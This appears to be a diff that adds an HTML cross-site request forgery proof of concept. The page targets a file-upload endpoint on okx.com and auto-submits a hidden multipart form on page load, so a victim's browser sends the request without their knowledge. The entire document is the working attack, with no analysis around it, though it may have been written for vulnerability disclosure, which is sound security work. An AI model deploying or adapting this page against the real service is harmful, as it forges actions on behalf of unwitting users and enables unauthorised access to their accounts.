@@ -1,0 +1,17 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>CSRF PoC</title>
+</head>
+<body>
+    <form action="https://www.okx.com/priapi/v3/growth/crm/upload" method="POST" enctype="multipart/form-data">
+        <input type="hidden" name="file" value="test content here">
+        <!-- Add other hidden fields if needed, as per the required payload -->
+        <input type="submit" value="Submit CSRF">
+    </form>
+
+    <script>
+        document.forms[0].submit();  // Auto-submit the form to initiate the CSRF request
+    </script>
+</body>
+</html>
